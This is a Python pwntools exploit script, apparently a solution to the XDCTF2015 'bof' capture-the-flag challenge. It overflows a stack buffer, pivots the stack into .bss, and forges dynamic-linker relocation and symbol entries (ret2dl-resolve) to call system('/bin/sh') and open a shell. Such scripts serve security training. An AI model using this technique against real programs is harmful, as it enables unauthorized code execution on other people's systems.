from pwn import *

p = process("./bof")
elf = ELF("./bof")
libc = elf.libc
p.recvuntil("Welcome to XDCTF2015~!\n")
offset = 112

read_plt = elf.plt["read"]
bss = 0x0804A028
pop_ebp_ret = 0x0804862B
leave_ret = 0x8048445
add_esp8_pop_ret = 0x0804836A
stack_size = 0x800
base_stage = stack_size + bss

payload = b"a" * offset
payload += p32(read_plt) + p32(add_esp8_pop_ret) + p32(0) + p32(base_stage) + p32(200)
payload += p32(pop_ebp_ret) + p32(base_stage - 4) + p32(leave_ret)

p.sendline(payload)

plt_relro = 0x8048370
write_reloc_offset = 0x20
DT_JMPREL = 0x8048324
DT_SYMTAB = 0x80481CC
DT_STRTAB = 0x0804826C
write_got = elf.got["write"]
write_info = ((((base_stage + 88 + 4 + 8 - DT_SYMTAB)) << 8) // 0x10) | 0x7

SRT_OFFSET = (base_stage + 88 + 4 + 8 + 6 * 4) - DT_STRTAB
r_info = base_stage + 24 - DT_JMPREL
print("write_info:" + hex(write_info))
print("r_info:" + hex(r_info))
print("SRT_OFFSET:" + hex(SRT_OFFSET))

payload = p32(plt_relro) + p32(r_info)
payload += b"aaaa"
payload += p32(base_stage + 80) + p32(base_stage + 80) + p32(len("/bin/sh\x00"))
payload += p32(write_got) + p32(write_info)
payload += b"a" * (80 - len(payload))
payload += b"/bin/sh\x00"
payload += b"\x00" * 12
payload += p32(SRT_OFFSET) + p32(0) + p32(0) + p32(12) + p32(0) + p32(0)
payload += b"system\x00\x00"
payload += b"a" * (200 - len(payload))

p.send(payload)
p.interactive()
